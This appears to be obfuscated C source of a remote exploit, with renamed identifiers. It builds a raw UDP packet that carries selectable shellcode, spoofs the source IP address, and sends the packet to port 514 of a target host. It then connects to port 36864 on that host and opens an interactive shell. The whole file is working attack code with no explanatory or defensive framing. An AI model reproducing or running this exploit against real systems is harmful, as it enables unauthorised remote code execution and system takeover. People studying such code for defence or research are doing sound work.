
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_long ;
struct udphdr {int len; void* dest; void* source; } ;
struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; void* sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int ttl; int daddr; int saddr; int protocol; void* tot_len; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int spoof_ip ;
typedef int host ;
struct TYPE_2__ {int l_sz; int shell; } ;


 int VAR_0 ;
 size_t VAR_1 ;
 int VAR_2 ;
 char* VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 char* VAR_8 ;
 int VAR_9 ;
 int FUNC_0 (char*) ;
 int FUNC_1 () ;
 int FUNC_2 (int) ;
 int FUNC_3 (int ,char*,...) ;
 struct hostent* FUNC_4 (char*) ;
 int FUNC_5 (int,char**,char*) ;
 int FUNC_6 (char*) ;
 void* FUNC_7 (int) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (struct in_addr) ;
 scalar_t__ FUNC_10 (int ,int) ;
 scalar_t__ FUNC_11 (int) ;
 int FUNC_12 (char*,size_t,int) ;
 int FUNC_13 (char*) ;
 TYPE_1__* VAR_10 ;
 int FUNC_14 (int) ;
 int FUNC_15 (int) ;
 int FUNC_16 (int,char*,int,size_t,struct sockaddr*,int) ;
 scalar_t__ FUNC_17 (char*,int) ;
 int FUNC_18 (int,int ,int ,char*,int) ;
 int FUNC_19 (int) ;
 int FUNC_20 (int ,int ,int ) ;
 int VAR_11 ;
 int VAR_12 ;
 int FUNC_21 (char*) ;
 int FUNC_22 (char*,char*,int) ;
 int FUNC_23 (char*,int *,int *) ;
 int FUNC_24 (char*) ;

int FUNC_25(int VAR_13,char **VAR_14)
{
 int VAR_15,VAR_16,VAR_17=VAR_1;
 struct hostent *VAR_18;
 struct sockaddr_in VAR_19;
 struct iphdr *VAR_20;
 struct udphdr *VAR_21;





 char VAR_22[0x82]="216.239.33.101";

 int VAR_23=(36864);






 char VAR_24[0x82]="localhost";



 u_long VAR_25=VAR_10[VAR_17].shell;
 int VAR_26=VAR_10[VAR_17].l_sz;
 int VAR_27,VAR_28;
 char *VAR_29,*VAR_30;

 (void)FUNC_1();
 if(VAR_13<2)
 {
  (void)FUNC_24(VAR_14[VAR_1]);
 }

 while((VAR_16=FUNC_5(VAR_13,VAR_14,"L:l:H:h:F:f:T:t:IiS:s:"))!=-1)
 {
  extern char *VAR_31;
  switch(VAR_16)
  {
   case 'H':
   case 'h':
    FUNC_12((char *)VAR_24,VAR_1,sizeof(VAR_24));
    FUNC_22(VAR_24,VAR_31,sizeof(VAR_24)-1);
    break;

   case 'F':
   case 'f':
    FUNC_12((char *)VAR_22,VAR_1,sizeof(VAR_22));
    FUNC_22(VAR_22,VAR_31,sizeof(VAR_22)-1);
    break;

   case 'L':
   case 'l':
    VAR_26=FUNC_0(VAR_31);
    break;

   case 'T':
   case 't':
    VAR_17=FUNC_0(VAR_31);
    if(VAR_17>4)
     (void)FUNC_24(VAR_14[VAR_1]);
    else
    {
     VAR_25=VAR_10[VAR_17].shell;
     VAR_26=VAR_10[VAR_17].l_sz;
    }
    break;

   case 'S':
   case 's':
    VAR_25=FUNC_23(VAR_31,((void*)0),((void*)0));
    break;

   case 'I':
   case 'i':
    (void)FUNC_24(VAR_14[VAR_1]);
    break;

   case '?':
    FUNC_3(VAR_11," Try `%s -i' for more information.\n\n",VAR_14[VAR_1]);
    FUNC_2(-1);
    break;
  }
 }
 {
      FUNC_3(VAR_12," [0] Set packet code size.\n");
  VAR_28=FUNC_21((char *)FUNC_10(VAR_25,VAR_26));
  VAR_27=(sizeof(struct iphdr)+
    sizeof(struct udphdr)+VAR_28);
  VAR_29=(char *)FUNC_11(VAR_27);
  FUNC_12((char *)VAR_29,VAR_1,VAR_27);
  VAR_30=(sizeof(struct iphdr)+
    sizeof(struct udphdr)+
    (char *)VAR_29);
  FUNC_3(VAR_12," [1] Set protocol header.\n");
  VAR_20=(struct iphdr *)VAR_29;
  VAR_21=(struct udphdr *)(sizeof(struct iphdr)+VAR_29);
  FUNC_3(VAR_12," [2] Make shellcode.\n");
  FUNC_22(VAR_30,(char *)FUNC_10(VAR_25,VAR_26),VAR_28);
 }

 if((VAR_18=FUNC_4(VAR_24))==((void*)0))
 {
  FUNC_6(" gethostbyname()");
  FUNC_2(-1);
 }
 if((VAR_15=FUNC_20(VAR_0,VAR_9,VAR_5))==-1)
 {
  FUNC_13(" socket()");
  FUNC_2(-1);
 }
 if(FUNC_18(VAR_15,VAR_4,VAR_7,"1",sizeof("1"))==-1)
 {
  FUNC_13(" setsockopt()");
  FUNC_2(-1);
 }

 FUNC_3(VAR_12," [3] Set rawsock.\n");

 VAR_20->version=4;
 VAR_20->ihl=sizeof(struct iphdr)/4;
 VAR_20->tot_len=FUNC_7(VAR_27);
 VAR_20->ttl=0xff;
 VAR_20->protocol=VAR_6;
 VAR_20->saddr=FUNC_8(VAR_22);
 VAR_20->daddr=FUNC_9(*((struct in_addr *)VAR_18->h_addr));

 VAR_21->source=FUNC_7(0x82);
 VAR_21->dest=FUNC_7(0x202);
 VAR_21->len=(VAR_27);

 VAR_19.sin_family=VAR_0;
 VAR_19.sin_port=VAR_21->dest;
 VAR_19.sin_addr=*((struct in_addr *)VAR_18->h_addr);
 FUNC_12(&(VAR_19.sin_zero),VAR_1,(8));

 FUNC_3(VAR_12," [4] Send packet.\n");

 if((FUNC_16(VAR_15,VAR_29,VAR_27,VAR_1,(struct sockaddr *)&VAR_19,sizeof(struct sockaddr)))==-1)
 {
  FUNC_13(" sendto()");
  FUNC_2(-1);
 }

 FUNC_3(VAR_12," [5] Trying %s:%d.\n",VAR_24,VAR_23);
 FUNC_19(2);
 VAR_15=(int)FUNC_17(VAR_24,VAR_23);
 (void)FUNC_14(VAR_15);

 FUNC_3(VAR_12," [*] Connected to %s:%d.\n",VAR_24,VAR_23);
 (void)FUNC_15(VAR_15);
}
